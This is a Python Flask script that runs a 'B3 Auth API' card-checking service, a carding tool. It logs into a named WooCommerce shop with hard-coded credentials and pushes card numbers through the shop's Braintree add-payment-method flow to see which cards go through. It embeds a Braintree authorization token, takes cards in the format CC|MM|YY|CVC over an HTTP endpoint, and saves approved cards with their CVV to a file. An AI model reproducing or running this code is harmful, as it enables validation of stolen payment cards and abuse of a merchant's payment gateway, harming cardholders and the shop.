import requests
from bs4 import BeautifulSoup
import re
import base64
import json
import uuid
import time
import os
import random
from flask import Flask, jsonify, request
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize Flask app
app = Flask(__name__)

class BraintreeLoginChecker:
    def __init__(self):
        self.session = requests.Session()
        # No proxy used
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
        # Known auth token
        self.known_auth_token = "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjgwNTE4NDYsImp0aSI6IjYyYjhjMjNlLTE3ZWUtNGRjNS05ODM4LTI0MjM0MDgwZDBiNCIsInN1YiI6IjNteWQ5cXJxemZqa3c5NDQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNteWQ5cXJxemZqa3c5NDQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.IDFUkXr3E9_qrYgMhfw8Zz8ZUw7kMMxHAqIlgJFD1Zk0aGphMLZyIuvv3hvSKa5nvA2T26EZWwREZEVpCT-6yw"
    
    def login(self, domain, username, password):
        login_url = f"{domain}/my-account/"
        
        try:
            # No proxies parameter
            response = self.session.get(login_url, headers=self.headers, verify=False, timeout=15)
        except Exception as e:
            return False, f"Connection failed: {str(e)}"

        if response.status_code != 200:
            return False, f"Failed to get login page (Status: {response.status_code})"
        
        # Force string to avoid NoneType issues
        response_text = response.text if response.text else ""
        
        soup = BeautifulSoup(response_text, 'html.parser')
        nonce_input = soup.find("input", {"name": "woocommerce-login-nonce"})
        
        login_nonce = None
        if not nonce_input:
            match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', response_text)
            if match:
                login_nonce = match.group(1)
        else:
            login_nonce = nonce_input.get("value")
        
        if not login_nonce:
            return False, "Login nonce not found in page source"
        
        login_data = {
            'username': username,
            'password': password,
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }
        
        login_headers = self.headers.copy()
        login_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url,
            'Origin': domain
        })
        
        try:
            # No proxies parameter
            login_response = self.session.post(login_url, headers=login_headers, data=login_data, verify=False, timeout=15)
        except Exception as e:
            return False, f"Post login failed: {str(e)}"
            
        login_text = login_response.text if login_response.text else ""

        if "Log out" in login_text or "My Account" in login_text or "Dashboard" in login_text:
            return True, self.session
        else:
            return False, "Login failed - Invalid credentials or redirect loop"
    
    def get_auth_tokens(self, domain, use_known_token=True):
        payment_url = f"{domain}/my-account/add-payment-method/"
        
        headers = self.headers.copy()
        headers['Referer'] = f"{domain}/my-account/"
        
        try:
            # No proxies parameter
            response = self.session.get(payment_url, headers=headers, verify=False, timeout=15)
        except Exception as e:
            return None, None, f"Connection error fetching payment page: {str(e)}"
        
        if response.status_code != 200:
            return None, None, f"Failed to get payment page (Status: {response.status_code})"
        
        response_text = response.text if response.text else ""

        add_nonce = None
        match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response_text)
        if match:
            add_nonce = match.group(1)
        else:
            return None, None, "Payment nonce not found"
        
        auth_token = None
        
        if use_known_token:
            auth_token = self.known_auth_token
        else:
            patterns = [
                r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]',
                r'clientToken:\s*["\']([^"\']+)["\']',
                r'authorizationFingerprint["\']?\s*:\s*["\']([^"\']+)["\']',
                r'Bearer\s+([^\s"\']+)'
            ]
            
            for pattern in patterns:
                if not isinstance(response_text, str):
                    continue
                    
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        if len(match) > 100:
                            try:
                                decoded = base64.b64decode(match).decode('utf-8')
                                auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                                if auth_match:
                                    auth_token = auth_match.group(1)
                                    break
                            except:
                                if 'eyJ' in match and '.' in match:
                                    auth_token = match
                                    break
            
            if not auth_token:
                soup = BeautifulSoup(response_text, 'html.parser')
                scripts = soup.find_all('script')
                for script in scripts:
                    if script.string:
                        content = script.string
                        if 'authorization' in content.lower() or 'braintree' in content.lower():
                            jwt_pattern = r'eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+'
                            matches = re.findall(jwt_pattern, content)
                            if matches:
                                auth_token = matches[0]
                                break
        
        if not auth_token:
            auth_token = self.known_auth_token
        
        return add_nonce, auth_token, "Success"
    
    def tokenize_card(self, card_data, auth_token):
        n, mm, yy, cvc = card_data
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        token_headers = {
            'authorization': f'Bearer {auth_token}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': self.headers['User-Agent']
        }
        
        try:
            # No proxies parameter
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=token_headers,
                json=json_data,
                verify=False,
                timeout=15
            )
        except Exception as e:
            return None
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                
                # FIX: Check if response_data is None before trying to access keys
                if response_data is None:
                    return None
                
                if 'data' in response_data and response_data['data'] is not None:
                    if 'tokenizeCreditCard' in response_data['data']:
                        if response_data['data']['tokenizeCreditCard'] is not None:
                            token = response_data['data']['tokenizeCreditCard'].get('token')
                            return token
                elif 'errors' in response_data:
                    return None
            except json.JSONDecodeError:
                return None
        return None
    
    def submit_payment(self, domain, add_nonce, token):
        payment_url = f"{domain}/my-account/add-payment-method/"
        
        submit_headers = self.headers.copy()
        submit_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': payment_url,
            'Origin': domain
        })
        
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        # No proxies parameter
        response = self.session.post(payment_url, headers=submit_headers, data=data, verify=False, timeout=20)
        
        return response

def check_card(cc_line):
    """Check a single credit card using the new BraintreeLoginChecker class"""
    start_time = time.time()
    
    # Configuration from the new script
    domain = "https://ddlegio.com"
    username = "xcracker663@gmail.com"
    password = "Xcracker@911"
    
    try:
        checker = BraintreeLoginChecker()
        
        # 1. Login
        success, result = checker.login(domain, username, password)
        if not success:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Login Error: {result}", "time": f"{elapsed_time:.2f}s"}
        
        # 2. Get Auth Tokens
        add_nonce, auth_token, msg = checker.get_auth_tokens(domain, use_known_token=True)
        if not add_nonce:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": f"Error: {msg}", "time": f"{elapsed_time:.2f}s"}
        
        if not auth_token:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": "No auth token available", "time": f"{elapsed_time:.2f}s"}
        
        # 3. Parse Card Data
        try:
            n, mm, yy, cvc = cc_line.strip().split('|')
        except ValueError:
            return {"status": "DECLINED", "response": "Invalid card format. Use CC|MM|YY|CVC", "time": "0.00s"}

        if len(yy) == 2:
            yy = '20' + yy
        
        # 4. Tokenize Card
        token = checker.tokenize_card((n, mm, yy, cvc), auth_token)
        if not token:
            elapsed_time = time.time() - start_time
            return {"status": "DECLINED", "response": "Card tokenization failed", "time": f"{elapsed_time:.2f}s"}
        
        # 5. Submit Payment
        response = checker.submit_payment(domain, add_nonce, token)
        
        # 6. Parse Response
        response_text = response.text if response.text else ""
        soup = BeautifulSoup(response_text, 'html.parser')
        
        success_div = soup.find('div', class_='woocommerce-message')
        error_div = soup.find('div', class_='woocommerce-error')
        
        final_status = "DECLINED"
        response_msg = "Unknown error"
        is_approved = False
        
        if success_div:
            message = success_div.get_text(strip=True)
            if any(word in message.lower() for word in ['success', 'added', 'approved']):
                final_status = "APPROVED"
                response_msg = message
                is_approved = True
            else:
                response_msg = message
        elif error_div:
            message = error_div.get_text(strip=True)
            if 'cvv' in message.lower() or 'security code' in message.lower():
                response_msg = "Reason: CVV - " + message
            else:
                response_msg = message
        else:
            notice_wrapper = soup.find('div', class_='woocommerce-notices-wrapper')
            if notice_wrapper:
                response_msg = notice_wrapper.get_text(strip=True)
            else:
                response_msg = "No response message found from gateway"

        elapsed_time = time.time() - start_time

        # Save approved cards to approved.txt
        if is_approved:
            try:
                with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                    approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {response_msg}
Gateway: Braintree Auth (New Logic)
Time: {elapsed_time:.1f}s
Bot By: @FailureFr
=========================

""")
            except Exception as e:
                print(f"Logging error: {e}")

        return {"status": final_status, "response": response_msg, "time": f"{elapsed_time:.2f}s"}
            
    except Exception as e:
        elapsed_time = time.time() - start_time
        return {"status": "DECLINED", "response": f"System Error: {str(e)}", "time": f"{elapsed_time:.2f}s"}

@app.route('/gate=b3/cc=<card>', methods=['GET'])
def check_credit_card(card):
    """Endpoint to check credit card"""
    try:
        # Validate card format
        if '|' not in card:
            return jsonify({"status": "DECLINED", "response": "Invalid format. Please use: CC_NUMBER|MM|YY|CVC"}), 400
            
        # Process the card
        result = check_card(card)
        
        # Return JSON response
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "DECLINED", "response": f"Error: {str(e)}"}), 500

@app.route('/')
def index():
    """Home endpoint with instructions"""
    return """
    <h1>B3 Auth API (No Proxy)</h1>
    <p>Use the endpoint: /gate=b3/cc={card}</p>
    <p>Format: CC_NUMBER|MM|YY|CVC</p>
    <p>Example: /gate=b3/cc=4111111111111111|12|25|123</p>
    <p>Target: ddlegio.com (via Login Method)</p>
    """

if __name__ == '__main__':
    # Get port from environment variable or use default 5000
    port = int(os.environ.get('PORT', 5000))
    # Bind to 0.0.0.0 for external access and disable debug mode
    app.run(host='0.0.0.0', port=port, debug=False)
